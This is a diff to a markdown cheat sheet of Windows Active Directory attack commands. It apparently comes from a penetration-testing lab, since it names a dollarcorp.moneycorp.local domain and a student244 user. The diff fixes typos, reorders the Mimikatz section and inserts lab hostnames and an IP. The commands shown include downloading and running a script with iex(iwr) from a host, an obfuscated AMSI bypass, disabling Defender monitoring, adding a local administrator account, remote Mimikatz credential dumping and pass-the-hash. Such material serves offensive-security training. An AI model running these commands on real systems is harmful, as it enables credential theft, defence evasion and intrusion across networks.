@@ -12,6 +12,7 @@
     * [Misc](#misc) 
 * [Local privilege escalation](#Local-privilege-escalation)
 * [Lateral Movement](#Lateral-Movement)
+   * [General](#General) 
    * [Mimikatz](#Mimikatz) 
 * [Domain Persistence](#Domain-Persistence)
    * [Golden Ticket](#Golden-Ticket) 
@@ -314,7 +315,7 @@ Invoke-UserHunter -Groupname "RDPUsers"
 Invoke-UserHunter -Groupname "Domain Admins"
 ```
 
-####  Fheck access to machine
+####  check access to machine
 ```
 Invoke-UserHunter -CheckAccess
 ```
@@ -366,7 +367,7 @@ Invoke-allchecks
 
 ####  Run powerup get services with unqouted paths and a space in their name
 ```
-Get-ServiceUnqouted -Verbose
+Get-ServiceUnquoted -Verbose
 Get-ModifiableServiceFile -Verbose
 ```
 
@@ -388,6 +389,7 @@ net user student244 SuWYn9WDHp86xk6M /add /Y   && net localgroup administrators 
 ```
 
 # Lateral Movement
+## General
 #### Connect to machine with administrator privs
 ```
 Enter-PSSession -Computername <computername>
@@ -403,13 +405,13 @@ Invoke-Command -Scriptblock {whoami} $sess
 
 #### Load script on a machine
 ```
-Invoke-Command -Computername <computername> -FilePath "<path>"
-Invoke-Command -FilePath "<path>" $sess
+Invoke-Command -Computername <computername> -FilePath <path>
+Invoke-Command -FilePath <path> $sess
 ```
 
 #### Download and load script on a machine
 ```
-iex (iwr http://xxx.xxx.xxx.xxx/<scriptname> -UseBasicParsing)
+iex (iwr http://172.16.100.244/<scriptname> -UseBasicParsing)
 ```
 
 #### AMSI Bypass
@@ -422,25 +424,10 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-#### Execute locally loaded function on the remote machines
+#### Execute locally loaded function on a list of remote machines
 ```
-Invoke-Command -Scriptblock ${function:Get-PassHashes} -Computername (Get-Content <list_of_servers>)
-```
-
-## Mimikatz
-#### Mimikatz dump credentials on local machine
-```
-Invoke-Mimikatz -Dumpcreds
-```
-
-#### Mimikatz dump credentials on multiple remote machines
-```
-Invoke-Mimikatz -Dumpcreds -Computername @(“sys1”,”sys2”)
-```
-
-#### Mimikatz start powershell pass the hash
-```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash> /run:powershell.exe"'
+Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)
+Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content C:\Users\student244\Documents\hosts.txt)
 ```
 
 #### Check the language mode
@@ -456,6 +443,23 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 #### Copy item to other server
 ```
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+## Mimikatz
+#### Mimikatz dump credentials on local machine
+```
+Invoke-Mimikatz -Dumpcreds
+```
+
+#### Mimikatz dump credentials on multiple remote machines
+```
+Invoke-Mimikatz -Dumpcreds -Computername @(“<system1>”,”<system2>”)
+Invoke-Mimikatz -Dumpcreds -ComputerName @("dcorp-ci","dcorp-mgmt")
+```
+
+#### Mimikatz start powershell pass the hash (run as local admin)
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash> /run:powershell.exe"'
 ```
 
 # Domain persistence
